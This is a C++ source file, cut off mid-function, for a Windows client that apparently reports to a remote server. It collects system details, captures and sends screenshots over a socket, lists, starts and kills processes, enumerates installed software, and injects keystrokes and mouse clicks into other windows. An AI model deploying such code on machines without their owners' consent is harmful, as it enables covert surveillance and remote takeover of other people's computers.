#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <winsock2.h> // Include winsock2.h before windows.h
#include <windows.h>
#include <ws2tcpip.h>
#include <objidl.h>   // For IStream
#include <gdiplus.h>  // Add GDI+ for screenshot capability
#include <memory>     // For smart pointers
#include <tlhelp32.h> // For process management functions
#include <iphlpapi.h>
#include <vector>
#include <map>
#include <psapi.h> // For GetModuleFileNameExA
#include <sstream>
#include <algorithm>
#include <cstdint>

// Link with required libraries
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib") // Link with IP Helper API
#pragma comment(lib, "psapi.lib")    // Link with psapi library

// Use Gdiplus namespace
using namespace Gdiplus;

#define PORT 8888
#define BUFFER_SIZE 1024
#define SERVER_IP "127.0.0.1" // Change to your server IP

// Get detailed system information
std::string get_sysinfo()
{
    SYSTEM_INFO sysInfo;
    OSVERSIONINFOEX osInfo;
    MEMORYSTATUSEX memInfo;
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    char userName[256];
    DWORD size = sizeof(computerName);
    DWORD userSize = sizeof(userName);
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
    char ipAddress[46]; // IPv4 or IPv6
    std::string additionalInfo = "";

    // Get computer name
    GetComputerNameA(computerName, &size);

    // Get username
    GetUserNameA(userName, &userSize);

    // Get system info
    GetSystemInfo(&sysInfo);

    // Get OS version info
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    // Note: GetVersionEx is deprecated, but still works for basic info
    GetVersionEx((OSVERSIONINFO *)&osInfo);

    // Get memory info
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);

    // Get disk info
    GetDiskFreeSpaceExW(L"C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes);

    // Get IP address (simplified)
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    char hostName[256];
    gethostname(hostName, sizeof(hostName));

    struct addrinfo hints, *res;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    getaddrinfo(hostName, NULL, &hints, &res);

    void *addr;
    if (res->ai_family == AF_INET)
    {
        struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;
        addr = &(ipv4->sin_addr);
    }
    else
    {
        struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)res->ai_addr;
        addr = &(ipv6->sin6_addr);
    }

    inet_ntop(res->ai_family, addr, ipAddress, sizeof(ipAddress));
    freeaddrinfo(res);

    // Get processor architecture
    std::string arch;
    switch (sysInfo.wProcessorArchitecture)
    {
    case PROCESSOR_ARCHITECTURE_AMD64:
        arch = "x64 (AMD or Intel)";
        break;
    case PROCESSOR_ARCHITECTURE_ARM:
        arch = "ARM";
        break;
    case PROCESSOR_ARCHITECTURE_ARM64:
        arch = "ARM64";
        break;
    case PROCESSOR_ARCHITECTURE_INTEL:
        arch = "x86 (Intel)";
        break;
    default:
        arch = "Unknown";
    }

    // Format the information with better spacing between sections
    char info[BUFFER_SIZE * 4]; // Increased buffer size for additional info
    snprintf(info, BUFFER_SIZE * 4,
             "\n=== DETAILED SYSTEM INFORMATION ===\n\n"
             "=== SYSTEM ===\n"
             "OS: Windows %ld.%ld (Build %ld)\n"
             "Service Pack: %ls\n"
             "Computer Name: %s\n"
             "Username: %s\n\n"

             "=== PROCESSOR ===\n"
             "Architecture: %s\n"
             "Number of Processors: %ld\n"
             "Processor Level: %d\n"
             "Processor Revision: %d\n\n"

             "=== MEMORY ===\n"
             "Memory Load: %ld%%\n"
             "Total Physical Memory: %.2f GB\n"
             "Available Physical Memory: %.2f GB\n"
             "Total Virtual Memory: %.2f GB\n"
             "Available Virtual Memory: %.2f GB\n\n"

             "=== DISK ===\n"
             "Total Disk Space (C:): %.2f GB\n"
             "Free Disk Space (C:): %.2f GB\n"
             "Disk Usage: %.2f%%\n\n"

             "=== NETWORK ===\n"
             "Host Name: %s\n"
             "IP Address: %s\n\n"
             "%s",

             osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber,
             osInfo.szCSDVersion,
             computerName,
             userName,

             arch.c_str(),
             sysInfo.dwNumberOfProcessors,
             sysInfo.wProcessorLevel,
             sysInfo.wProcessorRevision,

             memInfo.dwMemoryLoad,
             (double)memInfo.ullTotalPhys / (1024 * 1024 * 1024),
             (double)memInfo.ullAvailPhys / (1024 * 1024 * 1024),
             (double)memInfo.ullTotalVirtual / (1024 * 1024 * 1024),
             (double)memInfo.ullAvailVirtual / (1024 * 1024 * 1024),

             (double)totalBytes.QuadPart / (1024 * 1024 * 1024),
             (double)totalFreeBytes.QuadPart / (1024 * 1024 * 1024),
             100.0 - ((double)totalFreeBytes.QuadPart / totalBytes.QuadPart * 100.0),

             hostName,
             ipAddress,
             additionalInfo.c_str());

    WSACleanup();
    return std::string(info);
}

// Helper function to get encoder CLSID
int GetEncoderClsid(const WCHAR *format, CLSID *pClsid)
{
    UINT num = 0;  // number of image encoders
    UINT size = 0; // size of the image encoder array in bytes

    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;

    std::unique_ptr<ImageCodecInfo[]> pImageCodecInfo(new ImageCodecInfo[size]);
    if (pImageCodecInfo == nullptr)
        return -1;

    GetImageEncoders(num, size, pImageCodecInfo.get());

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            return j;
        }
    }

    return -1;
}

// Function to capture and send screenshot
bool capture_and_send_screenshot(SOCKET sock)
{
    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    gdiplusStartupInput.GdiplusVersion = 1;
    gdiplusStartupInput.DebugEventCallback = NULL;
    gdiplusStartupInput.SuppressBackgroundThread = FALSE;
    gdiplusStartupInput.SuppressExternalCodecs = FALSE;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Get screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Create compatible DC and bitmap
    HDC screenDC = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(screenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(screenDC, screenWidth, screenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(memDC, hBitmap);

    // Copy screen to bitmap
    BitBlt(memDC, 0, 0, screenWidth, screenHeight, screenDC, 0, 0, SRCCOPY);

    // Save bitmap to memory using GDI+
    Bitmap *bitmap = nullptr;
    bitmap = new Bitmap(hBitmap, NULL);

    // Create a memory stream
    IStream *stream = nullptr;
    CreateStreamOnHGlobal(NULL, TRUE, &stream);

    // Save bitmap to stream as PNG
    CLSID pngClsid;
    GetEncoderClsid(L"image/png", &pngClsid);
    bitmap->Save(stream, &pngClsid, NULL);

    // Get stream size and reset position
    LARGE_INTEGER liZero = {0};
    ULARGE_INTEGER ulSize;
    stream->Seek(liZero, STREAM_SEEK_END, &ulSize);
    stream->Seek(liZero, STREAM_SEEK_SET, NULL);

    // Get stream data
    DWORD streamSize = (DWORD)ulSize.QuadPart;
    std::vector<BYTE> buffer(streamSize);
    ULONG bytesRead;
    stream->Read(buffer.data(), streamSize, &bytesRead);

    // First send the file size
    uint64_t size = streamSize;
    uint8_t size_bytes[8];
    for (int i = 0; i < 8; i++)
    {
        size_bytes[7 - i] = (size >> (i * 8)) & 0xFF;
    }
    send(sock, (char *)size_bytes, 8, 0);

    // Then send the file data
    int total_sent = 0;
    while (total_sent < streamSize)
    {
        int chunk_size = (streamSize - total_sent < 1024) ? static_cast<int>(streamSize - total_sent) : 1024;
        int sent = send(sock, (char *)buffer.data() + total_sent, chunk_size, 0);
        if (sent <= 0)
        {
            break;
        }
        total_sent += sent;
    }

    // Clean up
    stream->Release();
    delete bitmap;
    SelectObject(memDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, screenDC);
    Gdiplus::GdiplusShutdown(gdiplusToken);

    return (total_sent == streamSize);
}

// List all running processes
std::string list_processes()
{
    std::string process_list = "Running Processes:\n";
    process_list += "PID\tProcess Name\n";
    process_list += "------------------------\n";

    // Take a snapshot of all processes
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        return "Failed to create process snapshot";
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process
    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return "Failed to get process information";
    }

    // Iterate through all processes
    do
    {
// No need to convert - pe32.szExeFile is already a char array in ANSI builds
// and a wchar_t array in Unicode builds
#ifdef UNICODE
        // Convert wide string to narrow string if in Unicode mode
        char narrow_name[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, narrow_name, MAX_PATH, NULL, NULL);
        process_list += std::to_string(pe32.th32ProcessID) + "\t" + std::string(narrow_name) + "\n";
#else
        // In ANSI mode, just use the string directly
        process_list += std::to_string(pe32.th32ProcessID) + "\t" + std::string(pe32.szExeFile) + "\n";
#endif
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return process_list;
}

// Helper function to get the actual PID of a running process by name
DWORD GetActualProcessIdByName(const std::string &processName)
{
    DWORD processes[1024], bytesReturned, processCount;
    if (!EnumProcesses(processes, sizeof(processes), &bytesReturned))
    {
        return 0;
    }

    processCount = bytesReturned / sizeof(DWORD);
    std::string lowerProcessName = processName;
    std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::tolower);

    for (DWORD i = 0; i < processCount; i++)
    {
        if (processes[i] != 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
            if (hProcess != NULL)
            {
                char processPath[MAX_PATH];
                if (GetModuleFileNameExA(hProcess, NULL, processPath, MAX_PATH) > 0)
                {
                    std::string fullPath = processPath;
                    size_t lastSlash = fullPath.find_last_of("\\/");
                    std::string fileName = fullPath.substr(lastSlash + 1);

                    std::string lowerFileName = fileName;
                    std::transform(lowerFileName.begin(), lowerFileName.end(), lowerFileName.begin(), ::tolower);

                    if (lowerFileName.find(lowerProcessName) != std::string::npos)
                    {
                        CloseHandle(hProcess);
                        return processes[i];
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }
    return 0;
}

// Improved start_process function that tracks the actual PID
std::string start_process(const std::string &command)
{
    std::string processCommand = command;
    std::string processName;

    // Extract process name for PID tracking
    size_t lastSlash = command.find_last_of("\\/");
    if (lastSlash != std::string::npos)
    {
        processName = command.substr(lastSlash + 1);
    }
    else
    {
        processName = command;
    }

    // Remove extension if present
    size_t dotPos = processName.find_last_of(".");
    if (dotPos != std::string::npos)
    {
        processName = processName.substr(0, dotPos);
    }

    // If the command doesn't contain path separators, try to find it in common locations
    if (command.find('\\') == std::string::npos && command.find('/') == std::string::npos)
    {
        // First try in Start Menu Programs folder
        std::string startMenuPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\";
        std::string possiblePath = startMenuPath + command + ".lnk";

        if (GetFileAttributesA(possiblePath.c_str()) != INVALID_FILE_ATTRIBUTES)
        {
            // Found a shortcut, use it
            processCommand = possiblePath;
        }

        // If still not found, check common Windows applications
        if (processCommand == command)
        {
            if (_stricmp(command.c_str(), "notepad") == 0 ||
                _stricmp(command.c_str(), "notepad.exe") == 0)
            {
                processCommand = "C:\\Windows\\System32\\notepad.exe";
                processName = "notepad";
            }
            else if (_stricmp(command.c_str(), "calc") == 0 ||
                     _stricmp(command.c_str(), "calc.exe") == 0)
            {
                processCommand = "C:\\Windows\\System32\\calc.exe";
                processName = "calc";
            }
            else if (_stricmp(command.c_str(), "notepad++") == 0 ||
                     _stricmp(command.c_str(), "notepad++.exe") == 0)
            {
                // Try common Notepad++ installation paths
                std::vector<std::string> possiblePaths = {
                    "C:\\Program Files\\Notepad++\\notepad++.exe",
                    "C:\\Program Files (x86)\\Notepad++\\notepad++.exe"};

                for (const auto &path : possiblePaths)
                {
                    if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES)
                    {
                        processCommand = path;
                        processName = "notepad++";
                        break;
                    }
                }
            }
        }
    }

    // Get initial PIDs before launching
    std::vector<DWORD> initialPids;
    DWORD processes[1024], bytesReturned;
    if (EnumProcesses(processes, sizeof(processes), &bytesReturned))
    {
        DWORD processCount = bytesReturned / sizeof(DWORD);
        for (DWORD i = 0; i < processCount; i++)
        {
            if (processes[i] != 0)
            {
                initialPids.push_back(processes[i]);
            }
        }
    }

    // Try ShellExecute first - this handles shortcuts (.lnk files) properly
    HINSTANCE result = ShellExecuteA(NULL, "open", processCommand.c_str(), NULL, NULL, SW_SHOWNORMAL);
    if ((intptr_t)result > 32)
    {
        // Wait for the process to start
        Sleep(1000);

        // Find the new process by comparing PIDs
        DWORD newPid = 0;
        if (EnumProcesses(processes, sizeof(processes), &bytesReturned))
        {
            DWORD processCount = bytesReturned / sizeof(DWORD);
            for (DWORD i = 0; i < processCount; i++)
            {
                if (processes[i] != 0)
                {
                    // Check if this is a new PID
                    bool isNewPid = true;
                    for (DWORD oldPid : initialPids)
                    {
                        if (processes[i] == oldPid)
                        {
                            isNewPid = false;
                            break;
                        }
                    }

                    if (isNewPid)
                    {
                        // Check if this process matches our target
                        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
                        if (hProcess != NULL)
                        {
                            char processPath[MAX_PATH];
                            if (GetModuleFileNameExA(hProcess, NULL, processPath, MAX_PATH) > 0)
                            {
                                std::string fullPath = processPath;
                                std::string fileName = fullPath.substr(fullPath.find_last_of("\\/") + 1);

                                // Convert to lowercase for comparison
                                std::string lowerFileName = fileName;
                                std::transform(lowerFileName.begin(), lowerFileName.end(), lowerFileName.begin(), ::tolower);

                                std::string lowerProcessName = processName;
                                std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::tolower);

                                if (lowerFileName.find(lowerProcessName) != std::string::npos)
                                {
                                    newPid = processes[i];
                                    CloseHandle(hProcess);
                                    break;
                                }
                            }
                            CloseHandle(hProcess);
                        }
                    }
                }
            }
        }

        // If we found a PID, return it
        if (newPid != 0)
        {
            return "Process started successfully using ShellExecute: " + processCommand + " (Actual PID: " + std::to_string(newPid) + ")";
        }

        // If we couldn't find the PID, try to get it by name
        DWORD pidByName = GetActualProcessIdByName(processName);
        if (pidByName != 0)
        {
            return "Process started successfully using ShellExecute: " + processCommand + " (Actual PID: " + std::to_string(pidByName) + ")";
        }

        return "Process started successfully using ShellExecute: " + processCommand + " (PID unknown)";
    }

    // If all else fails, try CreateProcess
    STARTUPINFOA si = {sizeof(STARTUPINFOA)};
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    char *cmd = _strdup(processCommand.c_str());
    BOOL success = CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    DWORD error = GetLastError();
    free(cmd);

    if (success)
    {
        DWORD initialPid = pi.dwProcessId;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // Wait a moment for any child processes to start
        Sleep(1000);

        // Try to get the actual PID by name
        DWORD actualPid = GetActualProcessIdByName(processName);
        if (actualPid != 0 && actualPid != initialPid)
        {
            return "Process started successfully with initial PID: " + std::to_string(initialPid) +
                   " (Actual PID: " + std::to_string(actualPid) + ")";
        }

        return "Process started successfully with PID: " + std::to_string(initialPid);
    }

    return "Failed to start process: " + std::to_string(error) +
           " (Command: " + processCommand + ")";
}

// Terminate a process by PID
std::string terminate_process(const std::string &pid_str)
{
    try
    {
        DWORD pid = std::stoi(pid_str);
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);

        if (hProcess == NULL)
        {
            return "Failed to open process with PID " + pid_str + ": " + std::to_string(GetLastError());
        }

        if (!TerminateProcess(hProcess, 1))
        {
            CloseHandle(hProcess);
            return "Failed to terminate process with PID " + pid_str + ": " + std::to_string(GetLastError());
        }

        CloseHandle(hProcess);
        return "Process with PID " + pid_str + " terminated successfully";
    }
    catch (const std::exception &e)
    {
        return "Error: " + std::string(e.what());
    }
}

// Add this new function to get installed software
std::string get_installed_software()
{
    std::string result = "=== INSTALLED SOFTWARE ===\n\n";

    HKEY hUninstKey = NULL;
    HKEY hAppKey = NULL;
    WCHAR sDisplayName[MAX_PATH];
    WCHAR sUninstallString[MAX_PATH];
    WCHAR sVersion[MAX_PATH];
    WCHAR sPublisher[MAX_PATH];
    WCHAR sInstallDate[MAX_PATH];
    WCHAR keyName[MAX_PATH];
    DWORD dwBufferSize = MAX_PATH;
    DWORD dwDataType = 0;

    // Open the uninstall key
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                      0, KEY_READ, &hUninstKey) != ERROR_SUCCESS)
    {
        return "Failed to open registry key for installed software.";
    }

    // Enumerate all uninstall keys
    for (DWORD i = 0; RegEnumKeyExW(hUninstKey, i, keyName, &dwBufferSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS; i++)
    {
        dwBufferSize = MAX_PATH; // Reset buffer size for next iteration

        // Open the specific app key
        if (RegOpenKeyExW(hUninstKey, keyName, 0, KEY_READ, &hAppKey) != ERROR_SUCCESS)
            continue;

        // Get display name
        DWORD dwSize = MAX_PATH;
        if (RegQueryValueExW(hAppKey, L"DisplayName", NULL, &dwDataType, (LPBYTE)sDisplayName, &dwSize) != ERROR_SUCCESS)
        {
            RegCloseKey(hAppKey);
            continue; // Skip entries without a display name
        }

        // Get version
        dwSize = MAX_PATH;
        if (RegQueryValueExW(hAppKey, L"DisplayVersion", NULL, &dwDataType, (LPBYTE)sVersion, &dwSize) != ERROR_SUCCESS)
        {
            wcscpy_s(sVersion, L"N/A");
        }

        // Get publisher
        dwSize = MAX_PATH;
        if (RegQueryValueExW(hAppKey, L"Publisher", NULL, &dwDataType, (LPBYTE)sPublisher, &dwSize) != ERROR_SUCCESS)
        {
            wcscpy_s(sPublisher, L"Unknown");
        }

        // Get install date
        dwSize = MAX_PATH;
        if (RegQueryValueExW(hAppKey, L"InstallDate", NULL, &dwDataType, (LPBYTE)sInstallDate, &dwSize) != ERROR_SUCCESS)
        {
            wcscpy_s(sInstallDate, L"Unknown");
        }

        // Convert wide strings to narrow strings
        char displayName[MAX_PATH];
        char version[MAX_PATH];
        char publisher[MAX_PATH];
        char installDate[MAX_PATH];

        WideCharToMultiByte(CP_UTF8, 0, sDisplayName, -1, displayName, MAX_PATH, NULL, NULL);
        WideCharToMultiByte(CP_UTF8, 0, sVersion, -1, version, MAX_PATH, NULL, NULL);
        WideCharToMultiByte(CP_UTF8, 0, sPublisher, -1, publisher, MAX_PATH, NULL, NULL);
        WideCharToMultiByte(CP_UTF8, 0, sInstallDate, -1, installDate, MAX_PATH, NULL, NULL);

        // Add to result with pipe delimiter for easier parsing
        result += std::string(displayName) + " | " + std::string(version) + " | " +
                  std::string(installDate) + " | " + std::string(publisher) + "\n";

        RegCloseKey(hAppKey);
    }

    RegCloseKey(hUninstKey);

    // Also check HKEY_CURRENT_USER for more software
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                      0, KEY_READ, &hUninstKey) == ERROR_SUCCESS)
    {
        // Same enumeration as above
        // (Code omitted for brevity - would be identical to the HKLM section)
        RegCloseKey(hUninstKey);
    }

    return result;
}

// Add these functions for application control
HWND FindApplicationWindow(const std::string &processNameOrId)
{
    // Check if the input is a numeric PID
    bool isPid = true;
    DWORD targetPid = 0;

    try
    {
        targetPid = std::stoul(processNameOrId);
    }
    catch (...)
    {
        isPid = false;
    }

    if (isPid)
    {
        // Find window by PID
        HWND hwnd = NULL;
        HWND hwndTemp = GetTopWindow(NULL);

        while (hwndTemp != NULL)
        {
            DWORD pid = 0;
            GetWindowThreadProcessId(hwndTemp, &pid);

            if (pid == targetPid && IsWindowVisible(hwndTemp))
            {
                char className[256] = {0};
                GetClassNameA(hwndTemp, className, sizeof(className));

                // Skip certain system windows
                if (strcmp(className, "Shell_TrayWnd") != 0 &&
                    strcmp(className, "Button") != 0 &&
                    strcmp(className, "DummyDWMListenerWindow") != 0)
                {
                    // Check if this is a main window
                    if (GetWindow(hwndTemp, GW_OWNER) == NULL)
                    {
                        hwnd = hwndTemp;
                        break;
                    }
                }
            }

            hwndTemp = GetWindow(hwndTemp, GW_HWNDNEXT);
        }

        return hwnd;
    }

    // Original code for finding by process name
    HWND hwndTemp = FindWindowA(NULL, NULL);
    while (hwndTemp != NULL)
    {
        // Get process ID for this window
        DWORD pid;
        GetWindowThreadProcessId(hwndTemp, &pid);

        // Open the process
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess != NULL)
        {
            char processPath[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, NULL, processPath, MAX_PATH) > 0)
            {
                // Extract just the filename from the path
                std::string fullPath = processPath;
                size_t lastSlash = fullPath.find_last_of("\\/");
                std::string fileName = fullPath.substr(lastSlash + 1);

                // Convert to lowercase for case-insensitive comparison
                std::string lowerFileName = fileName;
                std::string lowerProcessName = processNameOrId;
                std::transform(lowerFileName.begin(), lowerFileName.end(), lowerFileName.begin(), ::tolower);
                std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::tolower);

                // Check if this is the process we're looking for
                if (lowerFileName.find(lowerProcessName) != std::string::npos && IsWindowVisible(hwndTemp))
                {
                    CloseHandle(hProcess);
                    return hwndTemp;
                }
            }
            CloseHandle(hProcess);
        }

        // Also check window title
        char windowTitle[256];
        GetWindowTextA(hwndTemp, windowTitle, sizeof(windowTitle));
        std::string title = windowTitle;
        std::string lowerTitle = title;
        std::string lowerProcessName = processNameOrId;
        std::transform(lowerTitle.begin(), lowerTitle.end(), lowerTitle.begin(), ::tolower);
        std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::tolower);

        if (lowerTitle.find(lowerProcessName) != std::string::npos && IsWindowVisible(hwndTemp))
        {
            return hwndTemp;
        }

        hwndTemp = GetWindow(hwndTemp, GW_HWNDNEXT);
    }
    return NULL;
}

// Forward declaration for processSpecialKey function
void processSpecialKey(const std::string &key, std::vector<INPUT> &inputs);

std::string send_keystrokes(const std::string &processNameOrId, const std::string &keys)
{
    HWND hwnd = FindApplicationWindow(processNameOrId);
    if (hwnd == NULL)
    {
        return "Failed to find window for process: " + processNameOrId;
    }

    // Get the process name for better reporting
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    char windowTitle[256] = {0};
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));

    // Try to bring window to foreground more aggressively
    // Sometimes SetForegroundWindow fails due to Windows restrictions
    DWORD foregroundThreadID = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
    DWORD currentThreadID = GetCurrentThreadId();

    // Attach threads to help with focus
    if (foregroundThreadID != currentThreadID)
    {
        AttachThreadInput(foregroundThreadID, currentThreadID, TRUE);
        BringWindowToTop(hwnd);
        SetForegroundWindow(hwnd);
        AttachThreadInput(foregroundThreadID, currentThreadID, FALSE);
    }
    else
    {
        BringWindowToTop(hwnd);
        SetForegroundWindow(hwnd);
    }

    // Wait longer for the window to become active
    Sleep(1000);

    // Use SendInput for more reliable input
    std::vector<INPUT> inputs;

    size_t i = 0;
    while (i < keys.length())
    {
        // Check for special key sequences in curly braces
        if (keys[i] == '{')
        {
            size_t endBrace = keys.find('}', i);
            if (endBrace != std::string::npos)
            {
                std::string specialKey = keys.substr(i, endBrace - i + 1);
                processSpecialKey(specialKey, inputs);
                i = endBrace + 1;
                continue;
            }
        }

        // Regular character processing
        char c = keys[i];
        SHORT vk = VkKeyScanA(c);
        BYTE vkCode = LOBYTE(vk);
        BYTE shiftState = HIBYTE(vk);

        // Add shift key down if needed
        if (shiftState & 1)
        {
            INPUT shiftDown = {0};
            shiftDown.type = INPUT_KEYBOARD;
            shiftDown.ki.wVk = VK_SHIFT;
            inputs.push_back(shiftDown);
        }

        // Key down
        INPUT keyDown = {0};
        keyDown.type = INPUT_KEYBOARD;
        keyDown.ki.wVk = vkCode;
        inputs.push_back(keyDown);

        // Key up
        INPUT keyUp = {0};
        keyUp.type = INPUT_KEYBOARD;
        keyUp.ki.wVk = vkCode;
        keyUp.ki.dwFlags = KEYEVENTF_KEYUP;
        inputs.push_back(keyUp);

        // Add shift key up if needed
        if (shiftState & 1)
        {
            INPUT shiftUp = {0};
            shiftUp.type = INPUT_KEYBOARD;
            shiftUp.ki.wVk = VK_SHIFT;
            shiftUp.ki.dwFlags = KEYEVENTF_KEYUP;
            inputs.push_back(shiftUp);
        }

        i++;
    }

    // Send all inputs
    if (!inputs.empty())
    {
        SendInput(inputs.size(), inputs.data(), sizeof(INPUT));
    }

    std::string windowInfo = windowTitle[0] ? std::string(" (Window: ") + windowTitle + ")" : "";
    return "Keystrokes sent to PID: " + std::to_string(pid) + windowInfo;
}

std::string click_at_position(const std::string &processName, int x, int y)
{
    HWND hwnd = FindApplicationWindow(processName);
    if (hwnd == NULL)
    {
        return "Failed to find window for process: " + processName;
    }

    // Bring window to foreground
    if (!SetForegroundWindow(hwnd))
    {
        return "Failed to set window to foreground";
    }

    // Wait for window to become active
    Sleep(500);

    // Get window position
    RECT rect;
    GetWindowRect(hwnd, &rect);

    // Calculate absolute position
    int absX = rect.left + x;
    int absY = rect.top + y;

    // Move cursor and click
    SetCursorPos(absX, absY);
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    Sleep(50);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);

    return "Clicked at position (" + std::to_string(x) + ", " + std::to_string(y) + ") in " + processName;
}

// Function to list and launch applications from Start Menu
std::string launch_from_start_menu(const std::string &appName)
{
    std::vector<std::string> startMenuPaths = {
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\",
        // Add user's start menu path
    };

    // Add user's start menu path
    char userProfilePath[MAX_PATH];
    if (ExpandEnvironmentStringsA("%USERPROFILE%", userProfilePath, MAX_PATH) > 0)
    {
        startMenuPaths.push_back(std::string(userProfilePath) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\");
    }

    // Search for the application in start menu paths
    std::string foundPath;
    bool found = false;

    for (const auto &basePath : startMenuPaths)
    {
        WIN32_FIND_DATAA findData;
        std::string searchPath = basePath + "*.lnk";

        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                std::string filename = findData.cFileName;
                std::string lowerFilename = filename;
                std::string lowerAppName = appName;

                // Convert to lowercase for case-insensitive comparison
                std::transform(lowerFilename.begin(), lowerFilename.end(), lowerFilename.begin(), ::tolower);
                std::transform(lowerAppName.begin(), lowerAppName.end(), lowerAppName.begin(), ::tolower);

                // Check if the filename contains the app name
                if (lowerFilename.find(lowerAppName) != std::string::npos)
                {
                    foundPath = basePath + filename;
                    found = true;
                    break;
                }

            } while (FindNextFileA(hFind, &findData));

            FindClose(hFind);
            if (found)
                break;
        }

        // Also search in subdirectories
        searchPath = basePath + "*";
        hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    std::string dirname = findData.cFileName;
                    if (dirname != "." && dirname != "..")
                    {
                        std::string subdir = basePath + dirname + "\\";

                        WIN32_FIND_DATAA subFindData;
                        std::string subSearchPath = subdir + "*.lnk";

                        HANDLE hSubFind = FindFirstFileA(subSearchPath.c_str(), &subFindData);
                        if (hSubFind != INVALID_HANDLE_VALUE)
                        {
                            do
                            {
                                std::string filename = subFindData.cFileName;
                                std::string lowerFilename = filename;
                                std::string lowerAppName = appName;

                                // Convert to lowercase for case-insensitive comparison
                                std::transform(lowerFilename.begin(), lowerFilename.end(), lowerFilename.begin(), ::tolower);
                                std::transform(lowerAppName.begin(), lowerAppName.end(), lowerAppName.begin(), ::tolower);

                                // Check if the filename contains the app name
                                if (lowerFilename.find(lowerAppName) != std::string::npos)
                                {
                                    foundPath = subdir + filename;
                                    found = true;
                                    break;
                                }

                            } while (FindNextFileA(hSubFind, &subFindData));

                            FindClose(hSubFind);
                            if (found)
                                break;
                        }
                    }
                }

            } while (FindNextFileA(hFind, &findData));

            FindClose(hFind);
            if (found)
                break;
        }
    }

    if (!found)
    {
        return "Application not found in Start Menu: " + appName;
    }

    // Get initial PIDs before launching
    std::vector<DWORD> initialPids;
    DWORD processes[1024], bytesReturned;
    if (EnumProcesses(processes, sizeof(processes), &bytesReturned))
    {
        DWORD processCount = bytesReturned / sizeof(DWORD);
        for (DWORD i = 0; i < processCount; i++)
        {
            if (processes[i] != 0)
            {
                initialPids.push_back(processes[i]);
            }
        }
    }

    // Launch the application using ShellExecute
    HINSTANCE result = ShellExecuteA(NULL, "open", foundPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
    if ((intptr_t)result > 32)
    {
